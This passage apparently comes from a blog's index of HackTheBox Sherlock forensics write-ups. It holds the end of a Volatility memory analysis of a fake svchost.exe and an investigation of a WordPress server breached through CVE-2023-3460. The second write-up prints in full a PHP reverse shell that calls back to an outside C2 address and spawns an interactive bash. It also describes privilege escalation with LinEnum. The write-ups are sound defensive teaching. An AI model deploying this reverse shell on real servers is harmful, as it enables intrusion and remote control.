6812\tsvchost.exe\t0x9e8b96564670\t0xbc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96564750\t0xc4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563870\t0xc8\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563250\t0xcc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96564c90\t0xd0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965634f0\t0xd4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b8088e0\t0xd8\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96188420\t0xdc\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b96563330\t0xe0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965635d0\t0xe4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563a30\t0xe8\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563bf0\t0xec\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563cd0\t0xf0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b88a4ad40\t0xfc\twindowstation\t0xf037f\twinsta0 6812\tsvchost.exe\t0x9e8b88bfb810\t0x100\tdesktop\t0xf01ff\tdefault 6812\tsvchost.exe\t0x9e8b88a4ad40\t0x104\twindowstation\t0xf037f\twinsta0 6812\tsvchost.exe\t0x9e8b8b808360\t0x110\tevent\t0x1f0003\t6812\tsvchost.exe\t0xb58d54a0c070\t0x114\tkey\t0x20019\tuser\\s-1-5-21-3239415629-1862073780-2394361899-1602_classes\\local settings\\software\\microsoft 6812\tsvchost.exe\t0xb58d54a09920\t0x118\tkey\t0x20019\tuser\\s-1-5-21-3239415629-1862073780-2394361899-1602_classes\\local settings 6812\tsvchost.exe\t0x9e8b8b809160\t0x11c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96563f70\t0x120\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565470\t0x124\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565550\t0x128\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b808a60\t0x12c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b808260\t0x130\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b808ae0\t0x134\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b808660\t0x138\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b808760\t0x13c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b808ee0\t0x140\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96565c50\t0x144\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965666d0\t0x148\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566970\t0x14c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965650f0\t0x150\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566430\t0x154\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965659b0\t0x158\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965657f0\t0x15c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965651d0\t0x160\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965658d0\t0x164\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566350\t0x168\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b808460\t0x16c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b82b080\t0x170\tthread\t0x1003\ttid 2032 pid 6812 6812\tsvchost.exe\t0x9e8b8b6746f0\t0x174\tmutant\t0x1f0001\t6812\tsvchost.exe\t0x9e8b8b674790\t0x178\tmutant\t0x1f0001\t6812\tsvchost.exe\t0xb58d4dc1e9b0\t0x17c\ttoken\t0xf01ff\t6812\tsvchost.exe\t0x9e8b8b6748d0\t0x180\tmutant\t0x1f0001\t6812\tsvchost.exe\t0x9e8b960de860\t0x184\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b8c7032f0\t0x188\tmutant\t0x1f0001\t6812\tsvchost.exe\t0x9e8b8b6754b0\t0x18c\tmutant\t0x1f0001\t6812\tsvchost.exe\t0x9e8b96565630\t0x190\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b0ae960\t0x194\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b965667b0\t0x198\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566890\t0x19c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566510\t0x1a0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b8083e0\t0x1a4\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b8b808f60\t0x1a8\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b8b8086e0\t0x1ac\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96565a90\t0x1b4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96564e50\t0x1b8\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565390\t0x1bc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b954232e0\t0x1c0\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b95423b60\t0x1c4\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b954234e0\t0x1c8\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b965652b0\t0x1cc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96564f30\t0x1d0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565710\t0x1d4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b90127d90\t0x1d8\ttpworkerfactory\t0xf00ff\t6812\tsvchost.exe\t0x9e8b96567cc0\t0x1dc\tiocompletion\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b6dd070\t0x1e0\talpc port\t0x1f0001\t6812\tsvchost.exe\t0x9e8b965665f0\t0x1e4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565d30\t0x1e8\tetwregistration\t0x804\t6812\tsvchost.exe\t0xb58d54a0b4c0\t0x1ec\tkey\t0x20019\tuser 6812\tsvchost.exe\t0x9e8b96565b70\t0x1f0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b913841e0\t0x1f4\tfile\t0x100001\t\\device\\ksecdd 6812\tsvchost.exe\t0x9e8b913857c0\t0x1f8\tfile\t0x100001\t\\device\\cng 6812\tsvchost.exe\t0x9e8b8b0a7fe0\t0x208\tevent\t0x1f0003\t6812\tsvchost.exe\t0xb58d4dc1e9b0\t0x20c\ttoken\t0x8\t6812\tsvchost.exe\t0x9e8b90910c44\t0x210\tvregconfigurationcontext\t0x120189\t6812\tsvchost.exe\t0x9e8b8af76e80\t0x214\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b8b0a7ee0\t0x218\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b0af3e0\t0x21c\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b96565e10\t0x220\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96565ef0\t0x224\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965660b0\t0x228\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b0af760\t0x22c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96566190\t0x230\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566270\t0x234\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566f90\t0x238\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567850\t0x23c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965682d0\t0x240\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96568570\t0x244\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566c10\t0x248\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96568110\t0x24c\tetwregistration\t0x804\t6812\tsvchost.exe\t0xb58d4dc1e9b0\t0x250\ttoken\t0x8\t6812\tsvchost.exe\t0x9e8b8aec3080\t0x254\tthread\t0x1fffff\ttid 9240 pid 6812 6812\tsvchost.exe\t0x9e8b961a2de0\t0x258\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b8af76930\t0x25c\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b961a2c40\t0x260\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b965673f0\t0x264\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b960de1e0\t0x268\tsemaphore\t0x100003\t6812\tsvchost.exe\t0x9e8b8b3632c0\t0x26c\tthread\t0x1fffff\ttid 7980 pid 6812 6812\tsvchost.exe\t0x9e8b965674d0\t0x278\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567150\t0x27c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567af0\t0x280\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567070\t0x284\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567f50\t0x288\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566b30\t0x28c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b809360\t0x290\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b960d8c60\t0x294\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b90910790\t0x298\tfile\t0x100080\t\\device\\nsi 6812\tsvchost.exe\t0x9e8b96566a50\t0x29c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567690\t0x2ac\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96567230\t0x2b4\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96566eb0\t0x2b8\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965683b0\t0x2bc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965681f0\t0x2c0\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b808c60\t0x2c4\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b0e2070\t0x2d0\talpc port\t0x1f0001\t6812\tsvchost.exe\t0x9e8b960cff60\t0x2d4\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b809ce0\t0x2d8\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b909042b0\t0x2dc\tfile\t0x120089\t\\device\\namedpipe\\ 6812\tsvchost.exe\t0x9e8b8aec3080\t0x2e4\tthread\t0x1fffff\ttid 9240 pid 6812 6812\tsvchost.exe\t0x9e8b9090dbd4\t0x2e8\ttmen\t0x120196\t6812\tsvchost.exe\t0xb58d4a93e9b0\t0x2ec\ttoken\t0xf01ff\t6812\tsvchost.exe\t0x9e8b90118080\t0x2f0\tthread\t0x1fffff\ttid 6328 pid 6812 6812\tsvchost.exe\t0x9e8b8b809960\t0x2f4\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b809de0\t0x2f8\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b6ef080\t0x2fc\tprocess\t0x1fffff\tcmd.exe pid 4364 6812\tsvchost.exe\t0x9e8b8cd46270\t0x308\tetwregistration\t0x804\t6812\tsvchost.exe\t0xb58d52d94180\t0x30c\tkey\t0x8\tuser\\s-1-5-21-3239415629-1862073780-2394361899-1602\\software\\microsoft\\windows nt\\currentversion interesting location\n6812\tsvchost.exe\t0xb58d4a3b02a0\t0x44\tdirectory\t0x3\tknowndlls 6812\tsvchost.exe\t0x9e8b90911280\t0x48\tfile\t0x100020\t\\device\\harddiskvolume3\\users\\simon.stark\\downloads step 2: search for the file in the \\device\\harddiskvolume3\\users\\simon.stark\\downloads. $ vol3 -f 20230810.mem windows.filescan | grep \u0026#34;users\u0026#34; | grep \u0026#34;simon.stark\u0026#34; | grep \u0026#34;downloads\u0026#34; 0x9e8b8ae28ca0.0\\users\\simon.stark\\downloads\t216 0x9e8b8ae29dd0\t\\users\\simon.stark\\downloads\t216 0x9e8b909045d0\t\\users\\simon.stark\\downloads\\svchost.exe\t216 0x9e8b90911280\t\\users\\simon.stark\\downloads\t216 0x9e8b909142f0\t\\users\\simon.stark\\downloads\t216 0x9e8b91946a20\t\\users\\simon.stark\\downloads\t216 0x9e8b91ec0140\t\\users\\simon.stark\\downloads\\svchost.exe\t216 dump malicious file\n$ vol3 -f 20230810.mem windows.dumpfiles --virtaddr 0x9e8b909045d0 volatility 3 framework 2.7.1 progress: 100.00\tpdb scanning finished cache\tfileobject\tfilename\tresult datasectionobject\t0x9e8b909045d0\tsvchost.exe\terror dumping file imagesectionobject\t0x9e8b909045d0\tsvchost.exe\tfile.0x9e8b909045d0.0x9e8b957f24c0.imagesectionobject.svchost.exe.img don\u0026rsquo;t need the datasectionobject to analyze the binary. we are after the imagesectionobject.\ncheck the malware\u0026rsquo;s md5sum and send it to the reverse engineering team.\n$ md5sum file.0x9e8b909045d0.0x9e8b957f24c0.imagesectionobject.svchost.exe.img 5bd547c6f5bfc4858fe62c8867acfbb5 file.0x9e8b909045d0.0x9e8b957f24c0.imagesectionobject.svchost.exe.img virustotal\nvirustotal detection ratio: summary the ta used a legit windows binary file name to blend into the processes. but in the we successfully discovered their c2 server and iocs using memory forensics and from virustotal platform.\n","title":"HTB Sherlock RogueOne"},{"date":"2024-05-27","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/ultimatum/","summary":"Ultimatum (DFIR) Scenario One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics.","tags":["CVE-2023-3460","dfir","htb","linux","LinuxCatScale","member","plugin","sherlock","ultimate","ultimatum","worpress"],"text":"ultimatum (dfir) scenario one of the forela wordpress servers was a target of notorious threat actors (ta). the website was running a blog dedicated to the forela social club, where forela employees can chat and discuss random topics. unfortunately, it became a target of a threat group. the soc team believes this was due to the blog running a vulnerable plugin. the it admin already followed the acquisition playbook and triaged the server for the security team. ultimately (no pun intended) it is your responsibility to investigate the incident. step in and confirm the culprits behind the attack and restore this important service within the forela environment.\nforensics artifacts we are given an archive ultimatum.zip with a sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66.\nupon extracting the archive use extract-cat-scale.sh we get the following artifacts:\n-rwxrwxrwx 1 root root 1732 aug 8 2023 ip-172-31-11-131-20230808-0937-console-error-log.txt docker: total 0 logs: total 488 -rwxrwxrwx 1 root root 451801 aug 8 2023 ip-172-31-11-131-20230808-0937-last-btmp.txt -rwxrwxrwx 1 root root 329 aug 8 2023 ip-172-31-11-131-20230808-0937-last-utmp.txt -rwxrwxrwx 1 root root 606 aug 8 2023 ip-172-31-11-131-20230808-0937-last-utmpdump.txt -rwxrwxrwx 1 root root 732 aug 8 2023 ip-172-31-11-131-20230808-0937-last-wtmp.txt -rwxrwxrwx 1 root root 2397 aug 8 2023 ip-172-31-11-131-20230808-0937-lastlog.txt -rwxrwxrwx 1 root root 396 aug 8 2023 ip-172-31-11-131-20230808-0937-passwd-check.txt -rwxrwxrwx 1 root root 12 aug 8 2023 ip-172-31-11-131-20230808-0937-var-crash-list.txt -rwxrwxrwx 1 root root 115 aug 8 2023 ip-172-31-11-131-20230808-0937-var-crash.tar.gz -rwxrwxrwx 1 root root 2975 aug 8 2023 ip-172-31-11-131-20230808-0937-var-log-list.txt -rwxrwxrwx 1 root root 291 aug 8 2023 ip-172-31-11-131-20230808-0937-who.txt -rwxrwxrwx 1 root root 360 aug 8 2023 ip-172-31-11-131-20230808-0937-whoandwhat.txt drwxrwxrwx 12 root root 4096 may 27 10:10 varlogs misc: total 74804 -rwxrwxrwx 1 root root 559 aug 8 2023 ip-172-31-11-131-20230808-0937-setuid-setguid-tools.txt -rwxrwxrwx 1 root root 62 aug 8 2023 ip-172-31-11-131-20230808-0937-dev-dir-files-hashes.txt -rwxrwxrwx 1 root root 92 aug 8 2023 ip-172-31-11-131-20230808-0937-dev-dir-files.txt -rwxrwxrwx 1 root root 384887 aug 8 2023 ip-172-31-11-131-20230808-0937-exec-perm-files.txt -rwxrwxrwx 1 root root 34211795 aug 8 2023 ip-172-31-11-131-20230808-0937-full-timeline.csv -rwxrwxrwx 1 root root 41585177 aug 8 2023 ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt -rwxrwxrwx 1 root root 392840 aug 8 2023 ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt persistence: total 116 drwxrwxrwx 2 root root 4096 may 27 10:10 crontabs -rwxrwxrwx 1 root root 120 aug 8 2023 ip-172-31-11-131-20230808-0937-cron-folder-list.txt -rwxrwxrwx 1 root root 147 aug 8 2023 ip-172-31-11-131-20230808-0937-cron-tab-list.txt -rwxrwxrwx 1 root root 45449 aug 8 2023 ip-172-31-11-131-20230808-0937-persistence-systemdlist.txt -rwxrwxrwx 1 root root 775 aug 8 2023 ip-172-31-11-131-20230808-0937-service_status.txt -rwxrwxrwx 1 root root 27513 aug 8 2023 ip-172-31-11-131-20230808-0937-systemctl_all.txt -rwxrwxrwx 1 root root 23761 aug 8 2023 ip-172-31-11-131-20230808-0937-systemctl_service_status.txt podman: total 0 process_and_network: total 5008 drwxrwxrwx 3 root root 4096 may 27 10:10 cyberjunkie_admin -rwxrwxrwx 1 root root 671 aug 8 2023 ip-172-31-11-131-20230808-0937-ip-a.txt -rwxrwxrwx 1 root root 439 aug 8 2023 ip-172-31-11-131-20230808-0937-iptables-numerical.txt -rwxrwxrwx 1 root root 275 aug 8 2023 ip-172-31-11-131-20230808-0937-iptables.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-lsof-list-open-files.txt -rwxrwxrwx 1 root root 5474 aug 8 2023 ip-172-31-11-131-20230808-0937-process-cmdline.txt -rwxrwxrwx 1 root root 148446 aug 8 2023 ip-172-31-11-131-20230808-0937-process-details.txt -rwxrwxrwx 1 root root 28377 aug 8 2023 ip-172-31-11-131-20230808-0937-process-environment.txt -rwxrwxrwx 1 root root 11080 aug 8 2023 ip-172-31-11-131-20230808-0937-process-exe-links.txt -rwxrwxrwx 1 root root 111180 aug 8 2023 ip-172-31-11-131-20230808-0937-process-fd-links.txt -rwxrwxrwx 1 root root 1241355 aug 8 2023 ip-172-31-11-131-20230808-0937-process-map_files-link-hashes.txt -rwxrwxrwx 1 root root 3463139 aug 8 2023 ip-172-31-11-131-20230808-0937-process-map_files-links.txt -rwxrwxrwx 1 root root 11524 aug 8 2023 ip-172-31-11-131-20230808-0937-processes-axwwso.txt -rwxrwxrwx 1 root root 2991 aug 8 2023 ip-172-31-11-131-20230808-0937-processhashes.txt -rwxrwxrwx 1 root root 211 aug 8 2023 ip-172-31-11-131-20230808-0937-routetable.txt -rwxrwxrwx 1 root root 49785 aug 8 2023 ip-172-31-11-131-20230808-0937-ss-anepo.txt -rwxrwxrwx 1 root root 190 aug 8 2023 ip-172-31-11-131-20230808-0937-ssh-folders-list.txt drwxrwxrwx 3 root root 4096 may 27 10:10 root drwxrwxrwx 3 root root 4096 may 27 10:10 ubuntu system_info: total 340 drwxrwxrwx 30 root root 4096 may 27 10:10 etc-modified-files -rwxrwxrwx 1 root root 1968 aug 8 2023 ip-172-31-11-131-20230808-0937-cpuinfo.txt -rwxrwxrwx 1 root root 76 aug 8 2023 ip-172-31-11-131-20230808-0937-deb-package-verify.txt -rwxrwxrwx 1 root root 104466 aug 8 2023 ip-172-31-11-131-20230808-0937-deb-packages.txt -rwxrwxrwx 1 root root 1126 aug 8 2023 ip-172-31-11-131-20230808-0937-df.txt -rwxrwxrwx 1 root root 54667 aug 8 2023 ip-172-31-11-131-20230808-0937-dmesg.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-etc-key-files-list.txt -rwxrwxrwx 1 root root 4990 aug 8 2023 ip-172-31-11-131-20230808-0937-etc-modified-files-list.txt -rwxrwxrwx 1 root root 38 aug 8 2023 ip-172-31-11-131-20230808-0937-host-date-timezone.txt -rwxrwxrwx 1 root root 1863 aug 8 2023 ip-172-31-11-131-20230808-0937-lsmod.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-lsusb.txt -rwxrwxrwx 1 root root 1391 aug 8 2023 ip-172-31-11-131-20230808-0937-meminfo.txt -rwxrwxrwx 1 root root 112329 aug 8 2023 ip-172-31-11-131-20230808-0937-modinfo.txt -rwxrwxrwx 1 root root 5151 aug 8 2023 ip-172-31-11-131-20230808-0937-module-sha1.txt -rwxrwxrwx 1 root root 4348 aug 8 2023 ip-172-31-11-131-20230808-0937-mount.txt -rwxrwxrwx 1 root root 2446 aug 8 2023 ip-172-31-11-131-20230808-0937-procmod.txt -rwxrwxrwx 1 root root 526 aug 8 2023 ip-172-31-11-131-20230808-0937-release.txt -rwxrwxrwx 1 root root 4570 aug 8 2023 ip-172-31-11-131-20230808-0937-sudo.txt user_files: total 8 drwxrwxrwx 5 root root 4096 may 27 10:10 hidden-user-home-dir -rwxrwxrwx 1 root root 315 aug 8 2023 hidden-user-home-dir-list.txt virsh: total 0 tools visual studio code sublime text editor linuxcatscale to extract the archive. analysis the web server was apache v2.4.41-4ubuntu3.14 and it was running wordpress v6.2.2 on ubuntu 20.04.6 lts (focal fossa) with a kernel version of 5.15.0-1036-aws.\nthe server was triaged and we were provided artifacts following the acquisition playbook. because this was an attack on the webserver most of the analysis for initial foothold will revolve around analyzing the access.log.\nfrom the access log, we see a lot of http requests coming in and out of the server from an ip 23.106.60.163 with the user agent wpscan v3.8.24 (https://wpscan.com/wordpress-security-scanner). the ta used this ip to scan forella\u0026rsquo;s wordpress blog for vulnerabilities.\nwpscanner is an automated security auditing tool for wordpress. it scans the wordpress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.\nthe log shows that the ta was successful in identifying a vulnerable plugin. it was ultimate-member - user profile, registration, login, member directory, content restriction \u0026amp; membership plugin, the version that was installed on forella\u0026rsquo;s wordpress site was v2.6.4.\naccording to mitre - the ultimate member wordpress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. this is actively being exploited in the wild. the cve assigned was cve-2023-3460 with a cvss (v3.x) base score of 9.8 critical. the exploit for this cve was publicly available at the time of the attack.\nafter identifying the vulnerability, the ta used a poc published on github by a security research firm named secragon. it was confirmed by analyzing the script\u0026rsquo;s user agents which were python-requests/2.28.1 and secragon offensive agen.\ntherefore, successfully creating an admin user named secragon the ta switched his ip to 198.16.74.45 and manually browsed the admin dashboard. we can confirm this by their user agent mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/116.0.\nto get a foothold on the server the ta created a malicious theme, which served as a reverse shell to perform remote command execution. they created the file here /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php. the code for the reverse shell is below.\n\u0026lt;?php // php-reverse-shell - a reverse shell implementation in php. comments stripped to slim it down. re: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // copyright (c) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $version = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;43.204.24.76\u0026#39;; $port = 6969; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;error: can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // parent exits } if (posix_setsid() == -1) { printit(\u0026#34;error: can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;warning: failed to daemonise. this is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;error: can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;error: shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;error: shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;sock read\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;sock: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;stdout read\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;stdout: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;stderr read\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;stderr: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; from this code we can see the c2 server 43.204.24.76:6969 and the command uname -a; w; id; /bin/bash -i the web shell executed on behalf of the ta. first, the web shell created a process with pid 234471 to execute the shell\u0026rsquo;s payload. then for /bin/bash -i command it created an interactive bash shell with the pid 234517.\nwww-data 234517 234471 2616 596 ? s 09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i www-data 234521 234517 4248 3444 ? s 09:01 00:00:00 /bin/bash -i to elevate the shell\u0026rsquo;s privilege the attacker used a bash script linenum.sh to enumerate potential privilege escalation vectors. the ta uploaded linenum.sh to /tmp and then /dev/shm directory.\n7,1,/dev/shm/linenum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631 and they were successful in gaining root access. from the auth.log we see that the ta logged into ssh using ubuntu user\u0026rsquo;s private ssh key using another ip 203.101.190.9. then escalate their privilege to root using su.\nimmediately after that, the threat actor created an account cyberjunkie_admin for persistence.\naug 7 13:50:25 ip-172-31-11-131 sshd[229515]: accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: rsa sha256:c/25gw2hce4yy/6f4ead5o1dvdgebtufkoevah7kmzk aug 7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0) aug 7 13:50:25 ip-172-31-11-131 systemd-logind[523]: new session 1971 of user ubuntu. aug 7 13:50:31 ip-172-31-11-131 sudo: ubuntu : tty=pts/0 ; pwd=/home/ubuntu ; user=root ; command=/usr/bin/su aug 7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0) aug 7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0 aug 7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0) aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: received sighup; restarting. aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: server listening on 0.0.0.0 port 22. aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: server listening on :: port 22. aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, gid=1001 aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, gid=1001 aug 7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, uid=1001, gid=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0 aug 7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin aug 7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user \u0026#39;cyberjunkie_admin\u0026#39; information aug 7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0 aug 7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0) closely examining the sudoers permission file we found a very risky configuration that allowed the ubuntu user to perform tasks as root without authentication.\n# created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on wed, 12 jul 2023 11:41:45 